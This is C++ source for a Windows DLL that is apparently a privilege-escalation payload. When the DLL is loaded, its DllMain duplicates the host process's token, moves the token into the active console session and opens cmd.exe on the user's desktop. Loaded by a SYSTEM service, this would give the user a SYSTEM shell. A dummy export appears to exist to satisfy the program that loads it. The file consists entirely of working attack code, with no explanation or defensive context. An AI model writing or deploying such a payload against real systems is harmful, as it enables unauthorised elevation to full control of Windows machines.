#include "pch.h"

extern "C"
{
    __declspec(dllexport) VOID FaileEntry()
    {
        return;
    }

    __declspec(dllexport) BOOL ShellSpawn()
    {
        BOOL bSuccess = FALSE;
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;
        DWORD sessionId = ::WTSGetActiveConsoleSessionId();
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        si.wShowWindow = SW_SHOW;
        si.lpDesktop = const_cast<wchar_t*>(L"Winsta0\\Default");

        if (sessionId == 0xFFFFFFFF)
            return FALSE;

        bSuccess = ::OpenProcessToken(
            ::GetCurrentProcess(),
            TOKEN_DUPLICATE | TOKEN_ADJUST_SESSIONID,
            &hToken);

        if (!bSuccess)
            return FALSE;

        bSuccess = ::DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            nullptr,
            SecurityAnonymous,
            TokenPrimary,
            &hDupToken);
        ::CloseHandle(hToken);

        if (!bSuccess)
            return FALSE;

        // Requires SeTcbPrivilege
        bSuccess = ::SetTokenInformation(
            hDupToken,
            TokenSessionId,
            &sessionId,
            sizeof(sessionId));

        if (!bSuccess)
        {
            ::CloseHandle(hDupToken);
            return FALSE;
        }

        bSuccess = ::CreateProcessAsUser(
            hDupToken,
            const_cast<wchar_t*>(L"C:\\Windows\\System32\\cmd.exe"),
            const_cast<wchar_t*>(L""),
            nullptr,
            nullptr,
            FALSE,
            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
            nullptr,
            nullptr,
            &si,
            &pi);
        ::CloseHandle(hDupToken);

        if (bSuccess)
        {
            ::CloseHandle(pi.hThread);
            ::CloseHandle(pi.hProcess);
        }

        return bSuccess;
    }
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
        ShellSpawn();

    return TRUE;
}